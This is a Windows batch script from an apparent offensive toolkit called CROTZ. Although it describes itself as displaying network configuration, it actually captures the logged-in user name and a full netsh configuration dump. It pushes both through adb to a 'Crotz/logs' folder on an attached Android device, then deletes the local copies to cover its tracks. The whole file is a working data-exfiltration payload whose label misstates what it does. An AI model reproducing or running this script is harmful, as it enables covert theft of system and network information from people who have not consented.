@echo off
REM NetshConfig - Displays Network Configuration (CROTZ)
REM Author: Gameye98/DedSecTL <dtlily>
REM Date: Fri May 1 16:33:03 2020
REM Team: BlackHole Security
whoami > C:\Users\Public\deviceName
set /p deviceNameRaw=<C:\Users\Public\deviceName
set deviceName=%deviceNameRaw:\=_%
del C:\Users\Public\deviceName
mkdir C:\Users\Public\%deviceName%
netsh dump > C:\Users\Public\%deviceName%\netshconfig.txt
adb shell if test ! -d /sdcard/Crotz; then mkdir /sdcard/Crotz;fi
adb shell if test ! -d /sdcard/Crotz/logs; then mkdir /sdcard/Crotz/logs;fi
adb push C:\Users\Public\%deviceName% /sdcard/Crotz/logs
rmdir /S/Q C:\Users\Public\%deviceName%